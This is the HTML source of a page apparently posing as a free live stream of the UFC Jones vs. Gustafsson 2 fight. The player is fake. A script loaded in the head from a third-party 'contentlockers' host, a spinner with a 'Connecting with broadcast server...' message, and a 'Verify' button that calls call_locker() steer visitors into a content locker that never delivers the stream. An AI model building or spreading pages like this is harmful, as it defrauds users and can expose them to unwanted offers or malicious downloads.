<!doctype html>
<html lang="en">

<head>
<script type="text/javascript" id="ogjs" src="https://www.fileoasis.net/contentlockers/load.php?id=e26f85c170c92597e24bb4323cb2e53b"></script>


    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" integrity="sha384-UHRtZLI+pbxtHCWp1t77Bi1L4ZtiqrqD80Kn4Z8NTSRyMA2Fd33n5dQ8lWUE00s/" crossorigin="anonymous">
    <link rel="stylesheet" href="colors.min.css">
    <link rel="stylesheet" href="main.css">

    <title>UFC: Jones vs. Gustafsson LIVE STREAM</title>

</head>

<body>

    <div class="container">
        
        <div class="row text-center justify-content-center">
            
            <div class="col-xl-6 col-lg-6 col-md-6 col-sm-8 col-xs-8 col-8 text-center justify-content-center">
            
                <img src="logo.png" class="img-fluid logo">
            
            </div>
        
        </div>
        
        <div class="row text-center justify-content-center">
                        
            <div class="col-xl-9 col-lg-8 col-md-8 col-sm-12 col-xs-12 col-12 text-center justify-content-center PLAYER">
                
                <div class="player-1">
                                        
                    <div class="player-2">
                        
                        <div class="s-1">
                            
                            <div class="player-header"><h1 class="watch">Watch Jones vs Gustafsson 2 fight <strong>LIVE</strong></h1></div>
                        
                            <i class="far fa-play-circle" onclick="play();"></i>
                        
                        </div>
                        
                        <div class="s-2">
                                                    
                            <i class="fas fa-spinner fa-spin"></i>
                            
                            <button class="btn btn-lg btn-outline-secondary bg-orange verify" type="submit" class="verify" onclick="call_locker();">Verify</button>

                            <div class="loading-header"><h2 class="load">Connecting with broadcast server...</h2></div>

                        </div>
                        
                    </div>
                    
                </div>
                
                <div class="player-statistics">
                
                    <i class="far fa-thumbs-up" onclick="like();"></i> <span class="likes"></span> <i class="far fa-thumbs-down" onclick="dislike();"></i> <span class="dislikes"></span> <i class="far fa-comment"></i> <span class="comments"></span> <i class="far fa-user"></i> <span class="online"></span>
                    
                </div>
                
            </div>
            
            <div class="col-xl-3 col-lg-4 col-md-4 col-sm-11 col-xs-11 col-11 text-center chat-column">
                
                <div class="chat"></div>
                
                <div class="send">
                    
                    <div class="input-group">
                        <input type="text" class="form-control" id="user-message" placeholder="Your message" aria-label="Your message" aria-describedby="button-send">
                        <div class="input-group-append">
                            <button class="btn btn-outline-secondary bg-white" type="submit" id="button-send" onclick="aComment();">Send</button>
                        </div>
                    </div>
                    
                </div>
                
            </div>
            
        </div>
        
    </div>

    <script src="https://code.jquery.com/jquery-3.3.1.min.js" integrity="sha256-FgpCb/KJQlLNfOu91ta32o/NMZxltwRo8QtmkMRdAu8=" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
    <script src="main.js"></script>

</body>

</html>
